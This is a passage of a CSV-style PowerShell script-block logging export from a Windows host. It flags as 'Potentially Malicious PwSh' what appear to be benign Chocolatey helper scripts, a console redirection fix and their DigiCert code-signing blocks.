ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgLXLfDm5ZO0F7n2Nexf5QBKk9rmoDUthxG+r4 # F9i69HgwDQYJKoZIhvcNAQEBBQAEggEAb2mru9l/KwdisLhftWBpxN2YplsjnNO8 # zOerUDH77YZLnOp6pfxlw9UDk6p2H7ZSf3PJz+1J4ENwf5p+TfyvqyZyYXPQ32to # qWgjxlTneLaqxbY8CnJe+4NWxDAEhbhSMObYX29KYVIq+iJ1q9yYpR2pNuE+/PAq # I3FXS45kX4WtsOfVnkJnWM/oIKKfEuywPi+a6l4dy/jMsEP3rzCdHjJIziLcIJ34 # lSv2YwwyUk8CYmQfWMAFLZfhH1Y8jmL6IR59aaSJ3oJxesogSfNvDK+LLc6tch7I # enySIVHhp4EaIijUSmbziY7zSHwkwnEwMWOKWcUxUQltJ+Rw/85ynKGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NzAwWjAjBgkqhkiG9w0BCQQxFgQUumRD/TbOT5Vq6kjT # F5SC4Ge0EbQwDQYJKoZIhvcNAQEBBQAEggEADeiy6pwgzhNhQoFY5dlA/QDn7A/Z # +0d5nogna5UjTzViKkhfAEXFS7/3Y0MNKSu7K9ypaZ5nSaBImxkGX40IAN0yzsU1 # RpA4GbDCp7JpLvFPmKBnuAKTOgvAr1b+wbojbWa24lAF/8gtvWw8Y4kjKQ3gvtPz # bpZWF+2pp5JBG+dpRHLizYL0ypB6Q/y0Vk9D3UvkdIpTfNG4OFZXxLVeh5/2V192 # LiKSonbjK4o8DXy85RvSk46BG2n1fy5M5vDQZZE6NAN61k306Jz15G76zQZ7vQx8 # bKdBLHWQb5jMK5+3EetGt+PpBoSAXLmYWaKKOojWHMUWnAYUf5kILPdPSA== # SIG # End signature block","73be1519-4648-4ed7-b305-605504afc242"
"2019-03-19 14:21:48.060 +01:00","Potentially Malicious PwSh","med","MSEDGEWIN10","PwSh",4104,80,"ScriptBlock: try { $bindingFlags = [Reflection.BindingFlags] ""Instance,NonPublic,GetField"" $objectRef = $host.GetType().GetField(""externalHostRef"", $bindingFlags).GetValue($host) $bindingFlags = [Reflection.BindingFlags] ""Instance,NonPublic,GetProperty"" $consoleHost = $objectRef.GetType().GetProperty(""Value"", $bindingFlags).GetValue($objectRef, @()) [void] $consoleHost.GetType().GetProperty(""IsStandardOutputRedirected"", $bindingFlags).GetValue($consoleHost, @()) $bindingFlags = [Reflection.BindingFlags] ""Instance,NonPublic,GetField"" $field = $consoleHost.GetType().GetField(""standardOutputWriter"", $bindingFlags) $field.SetValue($consoleHost, [Console]::Out) [void] $consoleHost.GetType().GetProperty(""IsStandardErrorRedirected"", $bindingFlags).GetValue($consoleHost, @()) $field2 = $consoleHost.GetType().GetField(""standardErrorWriter"", $bindingFlags) $field2.SetValue($consoleHost, [Console]::Error) } catch { Write-Output ""Unable to apply redirection fix"" }","MessageNumber: 1 ¦ MessageTotal: 1 ¦ Path: ¦ ScriptBlockId: aa3f09bd-77ec-4b5a-8990-8043c6dffd04 ¦ ScriptBlockText: try { $bindingFlags = [Reflection.BindingFlags] ""Instance,NonPublic,GetField"" $objectRef = $host.GetType().GetField(""externalHostRef"", $bindingFlags).GetValue($host) $bindingFlags = [Reflection.BindingFlags] ""Instance,NonPublic,GetProperty"" $consoleHost = $objectRef.GetType().GetProperty(""Value"", $bindingFlags).GetValue($objectRef, @()) [void] $consoleHost.GetType().GetProperty(""IsStandardOutputRedirected"", $bindingFlags).GetValue($consoleHost, @()) $bindingFlags = [Reflection.BindingFlags] ""Instance,NonPublic,GetField"" $field = $consoleHost.GetType().GetField(""standardOutputWriter"", $bindingFlags) $field.SetValue($consoleHost, [Console]::Out) [void] $consoleHost.GetType().GetProperty(""IsStandardErrorRedirected"", $bindingFlags).GetValue($consoleHost, @()) $field2 = $consoleHost.GetType().GetField(""standardErrorWriter"", $bindingFlags) $field2.SetValue($consoleHost, [Console]::Error) } catch { Write-Output ""Unable to apply redirection fix"" }","73be1519-4648-4ed7-b305-605504afc242"
"2019-03-19 14:21:48.655 +01:00","Potentially Malicious PwSh","med","MSEDGEWIN10","PwSh",4104,81,"ScriptBlock: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. $helpersPath = (Split-Path -parent $MyInvocation.MyCommand.Definition); $global:DebugPreference = ""SilentlyContinue"" if ($env:ChocolateyEnvironmentDebug -eq 'true') { $global:DebugPreference = ""Continue""; } $global:VerbosePreference = ""SilentlyContinue"" if ($env:ChocolateyEnvironmentVerbose -eq 'true') { $global:VerbosePreference = ""Continue""; $verbosity = $true } $installArguments = $env:chocolateyInstallArguments $overrideArgs = $false if ($env:chocolateyInstallOverride -eq 'true') { $overrideArgs = $true } $forceX86 = $false if ($env:chocolateyForceX86 -eq 'true') { $forceX86 = $true } $packageParameters = $env:chocolateyPackageParameters # ensure module loading preference is on $PSModuleAutoLoadingPreference = ""All""; Write-Debug ""Host version is $($host.Version), PowerShell Version is '$($PSVersionTable.PSVersion)' and CLR Version is '$($PSVersionTable.CLRVersion)'."" # grab functions from files Get-Item $helpersPath\functions\*.ps1 | ? { -not ($_.Name.Contains("".Tests."")) } | % { . $_.FullName; #Export-ModuleMember -Function $_.BaseName } # Export built-in functions prior to loading extensions so that # extension-specific loading behavior can be used based on built-in # functions. This allows those overrides to be much more deterministic # This behavior was broken from v0.9.9.5 - v0.10.3. Export-ModuleMember -Function * -Alias * -Cmdlet * $currentAssemblies = [System.AppDomain]::CurrentDomain.GetAssemblies() # load extensions if they exist $extensionsPath = Join-Path ""$helpersPath"" '..\extensions' if (Test-Path($extensionsPath)) { Write-Debug 'Loading community extensions' Get-ChildItem $extensionsPath -recurse -filter ""*.dll"" | Select -ExpandProperty FullName | % { $path = $_; if ($path.Contains(""extensions\chocolatey\lib-synced"")) { continue } try { Write-Debug ""Importing '$path'""; $fileNameWithoutExtension = $([System.IO.Path]::GetFileNameWithoutExtension($path)) Write-Debug ""Loading '$fileNameWithoutExtension' extension.""; $loaded = $false $currentAssemblies | % { $name = $_.GetName().Name if ($name -eq $fileNameWithoutExtension) { Import-Module $_ $loaded = $true } } if (!$loaded) { Import-Module $path; } } catch { if ($env:ChocolateyPowerShellHost -eq 'true') { Write-Warning ""Import failed for '$path'. Error: '$_'"" } else { Write-Warning ""Import failed for '$path'. If it depends on a newer version of the .NET framework, please make sure you are using the built-in PowerShell Host. Error: '$_'"" } } } #Resolve-Path $extensionsPath\**\*\*.psm1 | % { Write-Debug ""Importing `'$_`'""; Import-Module $_.ProviderPath } Get-ChildItem $extensionsPath -recurse -filter ""*.psm1"" | Select -ExpandProperty FullName | % { Write-Debug ""Importing `'$_`'""; Import-Module $_; } } # todo: explore removing this for a future version Export-ModuleMember -Function * -Alias * -Cmdlet * # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCCBpXDGe+ALqwCJ # YsrRVbudLVLfjC+vZjhGFqLdiSXpYaCCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgwmHjAcUy+iE+dyiIfi2zB5dbGJZWd7DUt/no # Ll1cr0gwDQYJKoZIhvcNAQEBBQAEggEARX58JVHLurcXQTf7fttDVIUmw5vuH+lD # raYqEYC1l92+ucU8i5J015Gv8jVcDC4gXcE4hijQ6rryX4ikBymH/qmVWLrIA4NU # a2aYYcq26oWCODgd9NOPoPvBNLg6wZNCR+BNpZ7EQ92mY4+hR6SO2lmap2D/MHCQ # FrQ6UIbfUTTHZ6KuJn8hEMizgb9w7n9uwzqh4KkA0mp/MJEIGTQIuIQTZvNs/oZQ # yTqOyO1DTHfTUs3PrvsPyTQam8k2c1z9MftLTeeAsTEScGa0/wu0HPTBdlXPVN3R # AmPtXHvT64I/IDN9FQ+NV6OdHrlOitGteeh+B6qDkoF3zr9UGzrdpaGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NzAzWjAjBgkqhkiG9w0BCQQxFgQUReNlyfyc12kJ8VKD # f/nnmCJJFB4wDQYJKoZIhvcNAQEBBQAEggEAbahPWSbk7P/cx1sVMWPwsMH7tEIi # 